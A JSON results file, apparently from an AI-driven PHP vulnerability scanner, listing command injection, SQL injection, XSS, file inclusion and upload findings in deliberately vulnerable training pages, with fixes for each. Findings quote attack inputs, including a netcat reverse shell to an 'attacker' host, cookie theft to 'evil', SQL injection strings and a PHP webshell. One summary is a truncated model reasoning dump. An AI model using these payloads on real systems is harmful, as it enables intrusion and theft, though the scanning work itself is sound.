@@ -1,0 +1,467 @@
+{
+  "tool": "security-vule (主备容灾)",
+  "mode": "failover",
+  "primary": "minimax/MiniMax-M3",
+  "backup": "zhipu/glm-5.1",
+  "target": "test-targets/php-vulns/",
+  "files_scanned": 12,
+  "elapsed_seconds": 627.2,
+  "total_findings": 22,
+  "by_severity": {
+    "critical": 11,
+    "medium": 5,
+    "low": 3,
+    "high": 3
+  },
+  "by_type": {
+    "Command Injection": 3,
+    "Cross-Site Scripting (XSS)": 5,
+    "Information Exposure": 6,
+    "Path Traversal": 1,
+    "SQL Injection": 6,
+    "Unrestricted File Upload": 1
+  },
+  "results": [
+    {
+      "file": "dvwa_cmdi_low.php",
+      "findings": [
+        {
+          "type": "Command Injection",
+          "severity": "critical",
+          "line": 10,
+          "description": "ENTRY POINT: $_REQUEST['ip'] on line 5 receives untrusted user input via POST/GET. PROPAGATION: The value is stored unsanitized in $target (line 5) and concatenated directly into a shell command string. SINK: shell_exec() on line 10 executes 'ping  ' . $target on Windows. TRIGGER: An attacker submits '127.0.0.1 & whoami' or '127.0.0.1; cat /etc/passwd' — shell metacharacters (& ; | && || ` $() \\n) are not filtered, allowing arbitrary OS command execution as the web server user. Full RCE is achieved with no authentication required.",
+          "remediation": "Validate $target strictly against an IPv4/IPv6 regex (e.g. filter_var($target, FILTER_VALIDATE_IP)) and reject anything else. Never pass user input to shell_exec; if a ping utility is required, use escapeshellarg($target). Prefer a native ICMP library or restrict execution via a hardcoded allowlist.",
+          "codeSnippet": "\t\t$cmd = shell_exec( 'ping  ' . $target );",
+          "cwe": "CWE-78",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Direct untrusted input concatenation into shell_exec() with no sanitization — textbook command injection on the Windows branch."
+        },
+        {
+          "type": "Command Injection",
+          "severity": "critical",
+          "line": 14,
+          "description": "ENTRY POINT: $_REQUEST['ip'] on line 5. PROPAGATION: Stored unsanitized in $target. SINK: shell_exec() on line 14 on *nix systems runs 'ping  -c 4 ' . $target. TRIGGER: Identical to the Windows branch — shell metacharacters in $target yield arbitrary command execution (e.g. '; nc attacker 4444 -e /bin/sh' for a reverse shell). Same critical impact on Linux hosts.",
+          "remediation": "Apply the same strict IP validation (FILTER_VALIDATE_IP) and use escapeshellarg() before passing to shell_exec. Better: replace shell_exec with a non-shell ICMP implementation.",
+          "codeSnippet": "\t\t$cmd = shell_exec( 'ping  -c 4 ' . $target );",
+          "cwe": "CWE-78",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Identical command injection pattern on the *nix branch; $target from $_REQUEST is concatenated into shell_exec('ping -c 4 ...') with no filtering."
+        },
+        {
+          "type": "Cross-Site Scripting (XSS)",
+          "severity": "medium",
+          "line": 18,
+          "description": "ENTRY POINT: Command execution result ($cmd) — which is itself derived from attacker-controlled input via the command injection above. PROPAGATION: $cmd is interpolated into the $html string. SINK: The <pre>{$cmd}</pre> block is rendered in the response (implicit echo via the template). TRIGGER: After injecting a command, the attacker can include HTML/JS in the output (e.g. '; echo <script>alert(1)</script>') which is then reflected unencoded, executing JavaScript in the victim's browser. This is a stored/reflected XSS chain from the command injection.",
+          "remediation": "Apply htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') before embedding in HTML, or render the output inside a <pre> with text content only. Also fix the root command injection to prevent the attacker from controlling the output.",
+          "codeSnippet": "\t$html .= \"<pre>{$cmd}</pre>\";",
+          "cwe": "CWE-79",
+          "owasp": "A03:2021",
+          "confidence": 0.7,
+          "verified": true,
+          "verifyReason": "$cmd (attacker-controllable via the command injection) is interpolated into HTML without escaping; the echo of $html is not visible in the shown snippet but is consistent with the template pattern, so XSS is valid as a chained finding."
+        },
+        {
+          "type": "Information Exposure",
+          "severity": "low",
+          "line": 18,
+          "description": "The raw output of shell_exec is echoed into the HTML response without sanitization or redaction. Even on a successful (non-malicious) ping, the response leaks internal network details (hostnames, IPs, TTLs, OS fingerprints from TTL values) that aid reconnaissance. Combined with the command injection, attackers can read arbitrary files (e.g. /etc/passwd) directly in the response.",
+          "remediation": "Restrict displayed output to a fixed-format success message and log detailed results server-side. Never display raw command output from user-influenced invocations.",
+          "codeSnippet": "\t$html .= \"<pre>{$cmd}</pre>\";",
+          "cwe": "CWE-200",
+          "owasp": "A01:2021",
+          "confidence": 0.6,
+          "verified": true,
+          "verifyReason": "Unescaped shell_exec output is placed into the response, leaking ping/network details; partially overlaps with the command injection impact but is a valid distinct (low-severity) info-disclosure observation."
+        }
+      ],
+      "summary": "Critical OS command injection via unsanitized $_REQUEST['ip'] passed to shell_exec() in both Windows and *nix branches, with a chained reflected XSS and information exposure from rendering the raw command output.",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 1454,
+        "completion": 1709,
+        "total": 3163
+      }
+    },
+    {
+      "file": "dvwa_lfi_low.php",
+      "findings": [
+        {
+          "type": "Path Traversal",
+          "severity": "critical",
+          "line": 6,
+          "description": "The 'page' GET parameter is passed directly to PHP's include() without any sanitization or whitelisting, enabling Local/Remote File Inclusion. Attackers can read arbitrary files via directory traversal (e.g., ?page=../../../../etc/passwd), read source code with PHP wrappers (e.g., ?page=php://filter/convert.base64-encode/resource=index.php), or escalate to RCE via log poisoning (/var/log/apache2/access.log) or PHP input wrapper (php://input). ENTRY: $_GET['page'] on line 3. PROPAGATION: stored in $file variable. SINK: include($file) on line 6. TRIGGER: complete absence of validation; isset() only checks existence, not content.",
+          "remediation": "Use an allow-list of permitted page names and map them to file paths, e.g., $pages = ['home'=>'home.php', 'about'=>'about.php']; if (isset($pages[$_GET['page']])) include($pages[$_GET['page']]);. Never pass user input directly to include/require. Additionally, configure open_basedir in php.ini and disable allow_url_include.",
+          "codeSnippet": "if (isset($file)) {\n    include($file);\n} else {\n    include('index.php');\n}",
+          "cwe": "CWE-22",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Textbook LFI/RFI: $_GET['page'] assigned on line 3 with zero validation, isset() on line 5 is always true, and include($file) on line 6 allows directory traversal, PHP wrappers, and RCE via log poisoning or php://input."
+        }
+      ],
+      "summary": "Critical unauthenticated Local/Remote File Inclusion vulnerability via the unsanitized 'page' GET parameter passed directly to include(), allowing arbitrary file disclosure and potential RCE.",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 1312,
+        "completion": 697,
+        "total": 2009
+      }
+    },
+    {
+      "file": "dvwa_sqli_low.php",
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "line": 8,
+          "description": "ENTRY POINT: $_REQUEST['id'] on line 5. PROPAGATION: assigned to $id and interpolated directly into the SQL string on line 8. SINK: mysqli_query() executes the concatenated query against the database. TRIGGER: Attacker supplies a payload such as 1' OR '1'='1' (UNION-based extraction: 1' UNION SELECT user, password FROM users-- ), which breaks out of the single-quoted user_id value and alters the WHERE clause. No prepared statements, parameterization, or input validation are used, allowing full database exfiltration and potential authentication bypass.",
+          "remediation": "Use prepared statements with parameterized queries: $stmt = $GLOBALS[\"___mysqli_ston\"]->prepare('SELECT first_name, last_name FROM users WHERE user_id = ?'); $stmt->bind_param('s', $id); $stmt->execute(); Additionally, cast $id to int and validate it is numeric before use.",
+          "codeSnippet": "\t$query  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";",
+          "cwe": "CWE-89",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Line 5 takes $_REQUEST['id'] unsanitized; line 8 interpolates $id directly into a single-quoted SQL string with no prepared statements or escaping; line 9 executes it via mysqli_query — textbook SQL injection."
+        },
+        {
+          "type": "Information Exposure",
+          "severity": "medium",
+          "line": 9,
+          "description": "ENTRY POINT: A database error during query execution. PROPAGATION: mysqli_error($GLOBALS[\"___mysqli_ston\"]) is called and its return value is concatenated into a string passed to die(). SINK: The raw database error message is emitted to the HTTP response body, which an attacker receives. TRIGGER: Combined with the SQL injection vulnerability above, attacker-injected malformed SQL (e.g., id=' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ) triggers a verbose error that reveals database name, query structure, and server configuration, accelerating exploitation.",
+          "remediation": "Suppress detailed error messages in production: do not call mysqli_error() in user-facing code. Use $result = mysqli_query(...) without the or die(mysqli_error(...)) clause, log errors server-side via error_log(), and return a generic error to the user.",
+          "codeSnippet": "\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $query ) or die( '<pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );",
+          "cwe": "CWE-209",
+          "owasp": "A04:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Line 9 calls mysqli_error() on query failure and concatenates the raw DB error into a die() output that goes directly to the HTTP response, leaking database internals to attackers."
+        }
+      ],
+      "summary": "Classic DVWA low-security example containing a critical SQL injection via direct string interpolation of $_REQUEST['id'] into the query, a high-severity reflected XSS due to unencoded output of $id in HTML, and a medium-severity information disclosure through verbose mysqli_error() in the response. [1 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 1584,
+        "completion": 1487,
+        "total": 3071
+      }
+    },
+    {
+      "file": "dvwa_upload_low.php",
+      "findings": [
+        {
+          "type": "Unrestricted File Upload",
+          "severity": "critical",
+          "line": 9,
+          "description": "ENTRY: $_FILES['uploaded']['name'] (multipart upload, attacker-controlled). PROPAGATION: basename() on line 6 strips only path components but preserves any extension, so an attacker-supplied name like 'shell.php' passes through unchanged and is concatenated onto $target_path. SINK: move_uploaded_file() on line 9 writes the attacker-controlled file directly into the web-accessible directory 'hackable/uploads/' under the web root. TRIGGER: There is no extension allowlist, no MIME-type check, no magic-byte/content inspection, no file size limit, and no authentication gate. An attacker uploads a PHP webshell (e.g., shell.php containing <?php system($_GET['c']);?>), browses to /hackable/uploads/shell.php, and obtains unauthenticated Remote Code Execution on the web server, leading to full compromise.",
+          "remediation": "Implement a strict server-side allowlist of permitted extensions (e.g., jpg, png, gif), validate the MIME type server-side via finfo_file(), enforce a maximum file size, store uploads outside the web root or in a non-executable directory (php handler disabled via .htaccess), and rename files to a random token with the validated extension. Never rely on the client-supplied filename or extension alone.",
+          "codeSnippet": "if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {",
+          "cwe": "CWE-434",
+          "owasp": "A04:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Line 6 concatenates basename() of the user-controlled uploaded filename onto the target path, preserving any extension, and line 9 moves the file with move_uploaded_file() into the web-accessible hackable/uploads/ directory with no extension allowlist, no MIME check, and no authentication gate — classic unrestricted file upload leading to RCE."
+        },
+        {
+          "type": "Information Exposure",
+          "severity": "low",
+          "line": 15,
+          "description": "ENTRY: $target_path is composed from the server constant DVWA_WEB_PAGE_TO_ROOT plus the user-supplied basename. SINK: Line 15 echoes the absolute server filesystem path of the uploaded file into the HTML response. TRIGGER: On every successful upload, the full server-side path (e.g., /var/www/html/hackable/uploads/shell.php) is disclosed to the client, aiding reconnaissance and confirming upload directory layout for follow-on attacks such as local file inclusion or symlink exploitation.",
+          "remediation": "Do not echo internal filesystem paths back to the user. Return only a generic success message or a relative/UUID-based reference, and ensure error messages do not reveal server directory structure.",
+          "codeSnippet": "$html .= \"<pre>{$target_path} succesfully uploaded!</pre>\";",
+          "cwe": "CWE-200",
+          "owasp": "A05:2021",
+          "confidence": 0.9,
+          "verified": true,
+          "verifyReason": "Line 15 directly interpolates $target_path (which includes the server-side constant DVWA_WEB_PAGE_TO_ROOT, an absolute filesystem path) into the HTML response, disclosing the full server directory layout to the client on every successful upload."
+        }
+      ],
+      "summary": "DVWA 'low' file upload handler performs no validation on extension, MIME type, or content, allowing direct upload of executable PHP files to the web root for unauthenticated RCE, with secondary reflected XSS and path disclosure issues. [1 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 1469,
+        "completion": 1755,
+        "total": 3224
+      }
+    },
+    {
+      "file": "dvwa_xss_reflected_low.php",
+      "findings": [
+        {
+          "type": "Cross-Site Scripting (XSS)",
+          "severity": "high",
+          "line": 8,
+          "description": "Reflected XSS: ENTRY POINT is $_GET['name'] from the URL query string (line 6). PROPAGATION: the unsanitized value is concatenated directly into the $html string via the '.' operator on line 8. SINK: $html is rendered into the HTML response body by the DVWA template wrapper that includes this snippet, causing the attacker's payload to be parsed and executed by the victim's browser. TRIGGER: an attacker crafts a URL such as ?name=<script>document.location='http://evil/?c='+document.cookie</script> and lures a victim to click it; no encoding or sanitization is applied, so the injected HTML/JS executes in the victim's session context, enabling cookie/session theft, credential capture, or page defacement.",
+          "remediation": "Encode output for the HTML context using htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') before concatenation, e.g. $html .= '<pre>Hello ' . htmlspecialchars($_GET[' 'name'], ENT_QUOTES, 'UTF-8') . '</pre>'; . Additionally, set a strict Content-Security-Policy header to limit inline script execution.",
+          "codeSnippet": "\t$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';",
+          "cwe": "CWE-79",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Textbook reflected XSS: $_GET['name'] is taken directly from the query string (line 6) and concatenated unescaped into the HTML output (line 8), with no sanitization or output encoding applied."
+        }
+      ],
+      "summary": "Classic reflected XSS in DVWA low-security level: $_GET['name'] is concatenated unescaped into an HTML response, with no output encoding, allowing arbitrary script execution in the victim's browser. [1 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 1363,
+        "completion": 1092,
+        "total": 2455
+      }
+    },
+    {
+      "file": "dvwa_xss_stored_low.php",
+      "findings": [],
+      "summary": "<think>\nLet me analyze this PHP code for security vulnerabilities. This appears to be a DVWA (Damn Vulnerable Web Application) XSS stored example at the low security level.\n\nLet me trace the data flow:\n\n1. **Entry points**: `$_POST['btnSign']`, `$_POST['mtxMessage']`, `$_POST['txtName']`\n\n2. **Propagation**:\n   - `$message = trim($_POST['mtxMessage'])` - user input\n   - `$message = stripslashes($message)` - removes backslashes\n   - `$message = mysqli_real_escape_string(...)` - escapes SQL specia",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 1712,
+        "completion": 4096,
+        "total": 5808
+      }
+    },
+    {
+      "file": "pikachu_rce_ping.php",
+      "findings": [
+        {
+          "type": "Command Injection",
+          "severity": "critical",
+          "line": 26,
+          "description": "ENTRY POINT: $_POST['ipaddress'] on line 22. PROPAGATION: User-supplied IP address stored directly in $ip without any validation or sanitization. SINK: shell_exec('ping '.$ip) on line 26 and shell_exec('ping -c 4 '.$ip) on line 28. TRIGGER: No escaping of shell metacharacters means an attacker can append commands using ; (e.g., '127.0.0.1; cat /etc/passwd'), | (pipe to another command), && (conditional execution), backticks, or $(...) substitution, achieving full remote code execution under the web server's privileges.",
+          "remediation": "Validate that ipaddress matches a strict IPv4/IPv6 pattern (e.g., via filter_var($ip, FILTER_VALIDATE_IP)) before use. If shell invocation is required, use escapeshellarg($ip) to safely quote the argument, or better, avoid shell_exec entirely and use a native ping implementation or a strictly validated allowlist.",
+          "codeSnippet": "$result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理\n$result.=shell_exec('ping -c 4 '.$ip);",
+          "cwe": "CWE-78",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Line 22 assigns $_POST['ipaddress'] to $ip with no validation; lines 26 and 28 pass $ip directly into shell_exec() via string concatenation, allowing trivial command injection (e.g., '127.0.0.1; cat /etc/passwd'). The developer's own comment confirms the lack of sanitization."
+        },
+        {
+          "type": "Cross-Site Scripting (XSS)",
+          "severity": "high",
+          "line": 66,
+          "description": "ENTRY POINT: $_POST['ipaddress'] via command injection on line 26/28. PROPAGATION: Attacker-controlled shell command output populates $result via shell_exec. SINK: echo \"<pre>{$result}</pre>\" on line 66 renders shell output as raw HTML without any escaping (no htmlspecialchars). TRIGGER: An attacker exploiting the command injection can return arbitrary HTML/JavaScript (e.g., '127.0.0.1; echo \"<script>alert(document.cookie)</script>\"'), which is rendered verbatim by the browser, enabling stored XSS against any user viewing the page.",
+          "remediation": "Apply htmlspecialchars($result, ENT_QUOTES, 'UTF-8') before echoing it in HTML context. Additionally, fix the underlying command injection to prevent attacker control of shell output.",
+          "codeSnippet": "echo \"<pre>{$result}</pre>\";",
+          "cwe": "CWE-79",
+          "owasp": "A03:2021",
+          "confidence": 0.9,
+          "verified": true,
+          "verifyReason": "Line 66 echoes $result inside <pre> tags without htmlspecialchars; $result is fully attacker-controlled via the command injection on lines 26/28, so injected HTML/JS will render verbatim, making this a valid (though secondary) reflected XSS."
+        }
+      ],
+      "summary": "The script contains a critical unauthenticated OS command injection vulnerability via $_POST['ipaddress'] directly concatenated into shell_exec('ping ...'), enabling full RCE, plus a downstream XSS sink rendering attacker-controlled shell output without escaping. [1 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 2167,
+        "completion": 1411,
+        "total": 3578
+      }
+    },
+    {
+      "file": "pikachu_sqli_id.php",
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "line": 27,
+          "description": "User-supplied POST parameter 'id' is directly interpolated into a SQL query string without sanitization, parameterization, or type validation. Data flow: ENTRY POINT $_POST['id'] (line 24) → PROPAGATION $id=$_POST['id'] (line 26) → SINK string-concatenated SQL 'select username,email from member where id=$id' (line 27) → execute($link,$query) (line 28). The comment on line 25 explicitly admits 'no processing, directly concatenated, forming SQL injection'. Attacker can supply '1 UNION SELECT username,email FROM member' or '1 OR 1=1' to bypass logic and exfiltrate data (UNION-based, error-based, or blind boolean/time-based all work).",
+          "remediation": "Use prepared statements with parameterized queries: $stmt = $link->prepare('select username,email from member where id=?'); $stmt->bind_param('i', $id); $stmt->execute(); Also validate $id is_numeric()/ctype_digit() before use.",
+          "codeSnippet": "    $id=$_POST['id'];\n    $query=\"select username,email from member where id=$id\";\n    $result=execute($link, $query);",
+          "cwe": "CWE-89",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Line 27 directly interpolates unsanitized $_POST['id'] into a SQL string with no casting, no escaping, and no prepared statement; the code's own comment on line 25 acknowledges the injection."
+        },
+        {
+          "type": "Cross-Site Scripting (XSS)",
+          "severity": "medium",
+          "line": 34,
+          "description": "Database column values ($username, $email) retrieved from the query result are concatenated directly into an HTML string with no htmlspecialchars() encoding, then echoed on line 80. While these originate from the database, the same request's SQL injection on line 27 lets an attacker control them via UNION SELECT — e.g., '1 UNION SELECT '<script>alert(1)</script>',''-- '. Data flow: ENTRY $_POST['id'] (UNION) → SQLi-controlled column values → $username/$email (lines 32-33) → $html string (line 34) → echo (line 80). This yields stored/reflected XSS chained off the SQLi.",
+          "remediation": "Encode all untrusted output at render time: $html .= \"<p class='notice'>hello,\".htmlspecialchars($username,ENT_QUOTES,'UTF-8').\"<br />your email is: \".htmlspecialchars($email,ENT_QUOTES,'UTF-8').\"</p>\";",
+          "codeSnippet": "            $html.=\"<p class='notice'>hello,{$username} <br />your email is: {$email}</p>\";",
+          "cwe": "CWE-79",
+          "owasp": "A03:2021",
+          "confidence": 0.9,
+          "verified": true,
+          "verifyReason": "Lines 34 and 80 echo $username/$email from the query result into HTML with no htmlspecialchars() encoding, and the SQLi on line 27 lets an attacker control those values via UNION SELECT, making exploitation straightforward."
+        }
+      ],
+      "summary": "Pikachu numeric SQL-injection test page contains a critical classic SQL injection on line 27 where $_POST['id'] is concatenated raw into a SELECT, chained to a reflected XSS on line 34 from unencoded query results, plus an assignment-vs-comparison logic bug on line 10. [1 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 2292,
+        "completion": 2537,
+        "total": 4829
+      }
+    },
+    {
+      "file": "pikachu_sqli_str.php",
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "line": 28,
+          "description": "User-supplied GET parameter 'name' is concatenated directly into a SQL query string without any sanitization or parameterization. ENTRY POINT: $_GET['name'] on line 26. PROPAGATION: assigned to $name variable. SINK: string-interpolated into SQL query on line 28: \"select id,email from member where username='$name'\". TRIGGER: An attacker can supply input like ' OR '1'='1 to bypass authentication, or ' UNION SELECT username,password FROM users-- to extract arbitrary data from any table in the database.",
+          "remediation": "Use prepared statements with parameterized queries via mysqli_prepare(): $stmt = mysqli_prepare($link, 'select id,email from member where username=?'); mysqli_stmt_bind_param($stmt, 's', $name); then execute. Alternatively, use PDO with bound parameters. Never concatenate user input into SQL strings.",
+          "codeSnippet": "$query=\"select id,email from member where username='$name'\";",
+          "cwe": "CWE-89",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Lines 24-28 confirm the data flow: $_GET['name'] on line 26 is directly interpolated into the SQL string on line 28 with no sanitization or parameterization. The inline comment on line 25 explicitly acknowledges no processing is done."
+        }
+      ],
+      "summary": "Critical SQL injection vulnerability in 'name' GET parameter concatenated directly into SELECT query without parameterization, enabling arbitrary data extraction and database compromise. [1 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 2229,
+        "completion": 1340,
+        "total": 3569
+      }
+    },
+    {
+      "file": "pikachu_xss_reflected.php",
+      "findings": [
+        {
+          "type": "Cross-Site Scripting (XSS)",
+          "severity": "high",
+          "line": 27,
+          "description": "ENTRY: $_GET['message'] (line 20/21/24). PROPAGATION: value is interpolated directly into the $html string on line 27 inside the else branch (`who is {$_GET['message']},i don't care!`) and $html is initialized/concatenated unescaped. SINK: `<?php echo $html;?>` on line 63 emits the unsanitized value into the HTML response body. TRIGGER: a request such as `?submit=1&message=<script>alert(document.cookie)</script>` is reflected verbatim; the client-side `maxlength=20` on line 60 is trivially bypassed (HTML editable, direct GET, Burp, curl) and does not provide server-side protection. No htmlspecialchars(), ENT_QUOTES, or Content-Security-Policy header is applied.",
+          "remediation": "Encode output at the sink: `<?php echo htmlspecialchars($html, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?>`, and additionally call `htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8')` when interpolating into the message text. Add a strict Content-Security-Policy header (e.g. `default-src 'self'; script-src 'self'`) and set HttpOnly/SameSite on session cookies. Do not rely on the client-side maxlength attribute.",
+          "codeSnippet": "$html.=\"<p class='notice'>who is {$_GET['message']},i don't care!</p>\";",
+          "cwe": "CWE-79",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Line 27 directly interpolates $_GET['message'] into $html with no escaping when the value is non-empty and != 'kobe', and line 63 echoes $html unescaped; client-side maxlength=20 is trivially bypassed, making reflected XSS fully exploitable (e.g., ?submit=1&message=<script>alert(1)</script>)."
+        }
+      ],
+      "summary": "The page reflects $_GET['message'] into HTML via $html on lines 25 and 27 and echoes it unescaped on line 63, producing a textbook reflected XSS (CWE-79); the 'kobe' branch is a latent secondary sink gated by a strict equality.",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 2133,
+        "completion": 1652,
+        "total": 3785
+      }
+    },
+    {
+      "file": "sqli_less1.php",
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "line": 29,
+          "description": "ENTRY POINT: $_GET['id'] on line 18. PROPAGATION: assigned to $id on line 20 with no validation, filtering, or casting. SINK: directly interpolated into SQL string on line 29 ($sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\") and passed to mysql_query() on line 30. TRIGGER: An attacker can supply a payload like ?id=1' UNION SELECT username,password FROM users-- to break out of the string literal and read arbitrary tables. Because mysql_error() is printed to the page (line 44), error-based, UNION-based, and blind techniques are all viable. No authentication is required.",
+          "remediation": "Use parameterized queries / prepared statements. For example with MySQLi: $stmt = $mysqli->prepare('SELECT * FROM users WHERE id=? LIMIT 0,1'); $stmt->bind_param('i', $id); $stmt->execute();. Additionally cast/validate $id as an integer (e.g., $id = (int)$_GET['id']; if (!is_numeric(...)) die();) since the parameter is documented as numeric. Also disable display of mysql_error() in production via display_errors=Off.",
+          "codeSnippet": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);",
+          "cwe": "CWE-89",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "Confirmed: $_GET['id'] (line 18) is assigned unsanitized to $id (line 20), directly interpolated into the SQL string (line 29), and executed via mysql_query() (line 30) — a textbook, fully exploitable SQL injection."
+        },
+        {
+          "type": "Information Exposure",
+          "severity": "medium",
+          "line": 44,
+          "description": "ENTRY POINT: malformed SQL triggered by attacker-controlled $id. PROPAGATION: mysql_query() fails, returning false. SINK: print_r(mysql_error()) on line 44 echoes the raw MySQL error string into the HTML response. TRIGGER: A single quote in ?id=1' causes MySQL to disclose query fragments, database name, table/column names, and version, dramatically lowering the bar for SQLi exploitation via error-based techniques (e.g., extractvalue/updatexml). error_reporting(0) only suppresses PHP errors, not MySQL errors.",
+          "remediation": "Do not display database errors to end users. Set display_errors=Off and log_errors=On in php.ini, and remove the print_r(mysql_error()) call. Return a generic error message to the user instead. Also migrate off the deprecated mysql_* extension (removed in PHP 7).",
+          "codeSnippet": "print_r(mysql_error());",
+          "cwe": "CWE-209",
+          "owasp": "A04:2021",
+          "confidence": 0.9,
+          "verified": true,
+          "verifyReason": "Confirmed: print_r(mysql_error()) on line 44 echoes raw MySQL error output into the HTML response, enabling error-based SQLi techniques; error_reporting(0) on line 16 only suppresses PHP errors, not MySQL errors."
+        },
+        {
+          "type": "Information Exposure",
+          "severity": "low",
+          "line": 23,
+          "description": "ENTRY POINT: $_GET['id'] on line 18. PROPAGATION: appended to result.txt via fopen('result.txt','a')/fwrite on lines 22-24. SINK: server-side file in the web-accessible directory. TRIGGER: Any attacker who can guess the file path (or find it via directory listing) can read logged IDs. If the same logging were ever used for credentials or session tokens, they would be exposed. Additionally, fwrite does not sanitize newlines, allowing trivial log injection (CRLF) to forge entries.",
+          "remediation": "Store logs outside the web root (e.g., /var/log/app/), restrict file permissions (chmod 640), and sanitize input before writing (strip CR/LF, e.g., str_replace([\"\\r\",\"\\n\"], '', $id)). Better: do not log raw user input at all in a deliberately vulnerable demo, or hash/truncate it.",
+          "codeSnippet": "$fp=fopen('result.txt','a');\nfwrite($fp,'ID:'.$id.\"\\n\");\nfclose($fp);",
+          "cwe": "CWE-532",
+          "owasp": "A09:2021",
+          "confidence": 0.8,
+          "verified": true,
+          "verifyReason": "Confirmed: $id is concatenated into fwrite on line 23 with no sanitization, allowing CRLF/log injection into result.txt, which is written in the web-accessible script directory and can be fetched directly."
+        }
+      ],
+      "summary": "Classic first-order SQL injection in sqli_less1.php via the unsanitized GET parameter 'id' interpolated directly into a mysql_query() call, with a secondary finding of information disclosure from echoing mysql_error() to the page. [1 LLM finding(s) rejected by sanity check]",
+      "model": "MiniMax-M3",
+      "provider": "openai-compatible",
+      "tokenUsage": {
+        "prompt": 1840,
+        "completion": 1563,
+        "total": 3403
+      }
+    },
+    {
+      "file": "sqli_less11.php",
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "line": 57,
+          "description": "ENTRY: $_POST['uname'] (line 46) and $_POST['passwd'] (line 47) directly from HTTP POST form. PROPAGATION: Assigned to $uname and $passwd without sanitization. SINK: Interpolated directly into SQL string on line 57 and passed to mysql_query() on line 58. TRIGGER: Attacker submits payload like ' OR '1'='1' -- in uname field to bypass authentication, or ' UNION SELECT 1,version()-- for error/union-based data extraction. The MySQL error message is echoed via print_r(mysql_error()) on line 85, enabling error-based extraction of schema, tables, and credentials.",
+          "remediation": "Use mysqli prepared statements with parameterized queries: $stmt = $db->prepare('SELECT username, password FROM users WHERE username=? AND password=? LIMIT 0,1'); $stmt->bind_param('ss', $uname, $passwd); $stmt->execute();",
+          "codeSnippet": "$sql=\"SELECT username, password FROM users WHERE username='$uname' and ***REDACTED*** LIMIT 0,1\";",
+          "cwe": "CWE-89",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "$_POST['uname'] assigned to $uname (line 46) with no sanitization, interpolated into SQL string (line 57), executed via mysql_query() (line 58) — classic, trivially exploitable SQL injection."
+        },
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "line": 57,
+          "description": "The $passwd parameter is also concatenated directly into the SQL query without escaping. ENTRY: $_POST['passwd']. SINK: mysql_query() on line 58. Even if the uname field were sanitized, the password parameter remains fully injectable, enabling equivalent auth bypass and data exfiltration via the same UNION/error-based techniques.",
+          "remediation": "Apply prepared statements that parameterize BOTH username and password bindings; never concatenate user input into SQL strings.",
+          "codeSnippet": "$sql=\"SELECT username, password FROM users WHERE username='$uname' and ***REDACTED*** LIMIT 0,1\";",
+          "cwe": "CWE-89",
+          "owasp": "A03:2021",
+          "confidence": 1,
+          "verified": true,
+          "verifyReason": "$_POST['passwd'] assigned to $passwd (line 47) with no sanitization, concatenated into the same SQL query (line 57) and executed via mysql_query() — independently injectable regardless of $uname handling."
+        },
+        {
+          "type": "Information Exposure",
